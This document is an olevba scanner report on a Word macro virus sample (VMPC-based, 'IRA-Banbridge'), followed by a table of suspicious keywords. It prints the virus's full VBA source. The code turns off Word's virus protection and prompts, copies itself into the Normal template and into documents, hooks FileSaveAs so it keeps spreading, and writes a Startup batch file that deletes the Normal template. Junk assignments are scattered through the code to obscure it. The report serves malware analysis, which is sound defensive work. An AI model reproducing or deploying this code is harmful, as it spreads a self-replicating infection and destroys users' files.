olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-c848b872c9d25ed0b7a72fe23d26a9a700d096ed
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-c848b872c9d25ed0b7a72fe23d26a9a700d096ed - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO irabanbridge.bas 
in file: Virus.MSWord.VMPC-based-c848b872c9d25ed0b7a72fe23d26a9a700d096ed - OLE stream: 'Macros/VBA/irabanbridge'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub irabanbridge()
    
    'Produced by,
    'The VicodinES Macro.Poppy Construction Kit v1.0b
    '================================================
    'Code Written by VicodinES "Hurt, everything..."
    'Poppy ID : 21066900-4794
    
    
On Error Resume Next
f10961 = u13823 & c2854 & Int(Rnd * 2657)
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
f15937 = u9404 & c7081 & k13018 & m9404
ActiveDocument.ReadOnlyRecommended = False
f9508 = u15289 & c14637 & Int(Rnd * 1830)
x6900210612 = 0
f14723 = u7600 & c11333 & Int(Rnd * 9473)
Set pp2106690011 = MacroContainer
f13329 = u13248 & c13733 & k12989 & m13248
 f6706$ = "c:\windows\startm~1\programs\startup\msfile.bat"
e21842106 = GetAttr(NormalTemplate.FullName)
If e21842106 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f6706$)
f19745 = u2020 & c7106 & k15520 & m2020
If e21842106 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(f6706$)
If e21842106 = vbReadOnly Then GoTo fuckoff
k10143 = m11535 & e11567
If e21842106 = vbReadOnly + vbArchive Then GoTo fuckoff
k8768 = m15142 & e6868
If pp2106690011 = NormalTemplate Then x6900210612 = 1
f3974 = u3915 & c11452 & k11299 & m3915
If x6900210612 = 1 Then OJSimpsonISaMurder69005 = NormalTemplate.FullName Else OJSimpsonISaMurder69005 = ActiveDocument.FullName
If x6900210612 = 1 Then cde210611 = ActiveDocument.FullName Else cde210611 = NormalTemplate.FullName
k10430 = m8322 & e888
Application.OrganizerCopy Source:=OJSimpsonISaMurder69005, Destination:=cde210611, Name:="irabanbridge", Object:=wdOrganizerObjectProjectItems
k7737 = m17847 & e13342
If x6900210612 = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
f13496 = u10452 & c16513 & Int(Rnd * 8485)
If x6900210612 = 0 Then
k12646 = m4151 & e12898
     If NormalTemplate.Saved = False Then NormalTemplate.Save
f12341 = u12831 & c11383 & k18710 & m12831
k12675 = m10306 & e8826
     End If
f11366 = u17757 & c8104 & k11271 & m17757
k14336 = m3485 & e12846
'VMPCK v1.0b
fuckoff:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "IRA-Banbridge", vbInformation
End Sub
Sub FileSaveAs()
    On Error Resume Next
k14518 = m10882 & e3734
k6237 = m6372 & e19608
Dialogs(wdDialogFileSaveAs).Show
    Call irabanbridge
End Sub
Sub ToolsMacro()
    On Error Resume Next
k2618 = m7995 & e6972
End Sub
Sub FileTemplates()
    On Error Resume Next
f8366 = u13012 & c18577 & Int(Rnd * 9403)
f4711 = u12256 & c12262 & Int(Rnd * 3311)
End Sub
Sub ViewVBCode()
    On Error Resume Next
f12522 = u10188 & c13119 & k18171 & m10188
k2709 = m11236 & e9924
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
f12449 = u10661 & c13430 & k10865 & m10661
n$ = NormalTemplate
Part11$ = "attrib -h -r "
f14307 = u13130 & c6897 & Int(Rnd * 3551)
snag$ = "c:\progra~1\micros~1\templa~1\"
f13902 = u9195 & c11648 & Int(Rnd * 6410)
snag1$ = "c:\progra~1\micros~2\templa~1\"
Part2$ = "del "
f7652 = u7628 & c11055 & k14083 & m7628
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

